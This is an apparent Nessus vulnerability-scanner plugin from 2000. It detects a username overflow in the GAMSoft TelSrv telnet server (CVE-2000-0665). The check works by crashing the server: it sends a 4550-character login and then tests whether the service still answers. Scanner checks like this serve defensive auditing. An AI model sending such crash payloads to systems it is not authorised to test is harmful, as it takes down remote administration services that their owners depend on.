#
# This script was written by Prizm <Prizm@RESENTMENT.org>
#
# See the Nessus Scripts License for details
#
# Changes by rd: 
# - description changed somehow
# - handles the fact that the shareware may not be registered


if(description) {
    script_id(10474);
    script_bugtraq_id(1478);
 script_version ("$Revision: 1.14 $");
    script_cve_id("CVE-2000-0665");
    name["english"] = "GAMSoft TelSrv 1.4/1.5 Overflow";
    script_name(english:name["english"]);

    desc["english"] = "
It is possible to crash the remote telnet server by
sending a username that is 4550 characters long.

An attacker may use this flaw to prevent you
from administering this host remotely.

Solution : Contact your vendor for a patch.

Risk factor : High";

     desc["francais"] = "
Il est possible de faire planter le serveur telnet
distant en utilisant un nom de login de 4550 charactères.

Un pirate peut utiliser ce problème pour vous empecher
d'administrer ce serveur à distance.

Facteur de risque : Elevé 
Solution : contactez votre vendeur et demandez un patch";


    script_description(english:desc["english"],
    			francais:desc["francais"]);

    summary["english"] = "Crash GAMSoft TelSrv telnet server.";
    script_summary(english:summary["english"]);

    script_category(ACT_DENIAL);

    script_copyright(english:"This script is Copyright (C) 2000 Prizm <Prizm@RESENTMENT.org");
    family["english"] = "Denial of Service";
    family["francais"] = "Déni de service";
    script_family(english:family["english"], francais:family["francais"]);
    script_dependencie("find_service.nes");
    script_require_ports("Services/telnet", 23);
    exit(0);
}
include('telnet_func.inc');
port = get_kb_item("Services/telnet");
if(!port)port = 23;
if(!get_port_state(port))exit(0);

soc = open_sock_tcp(port);
if(soc)
{
  r = telnet_negotiate(socket:soc);
  r2 = recv(socket:soc, length:4096);
  r = r + r2;
  if(r)
  {
  r = recv(socket:soc, length:8192);
  if("5 second delay" >< r)sleep(5);
  r = recv(socket:soc, length:8192);
  req = string(crap(4550), "\r\n");
  send(socket:soc, data:req);
  close(soc);
  sleep(1);

  soc2 = open_sock_tcp(port);
  if(!soc2)security_hole(port);
  else {
        r = telnet_negotiate(socket:soc2);
	r2 = recv(socket:soc2, length:4096);
	r = r + r2;
        close(soc2);
        if(!r)security_hole(port);
      }
  }  
}

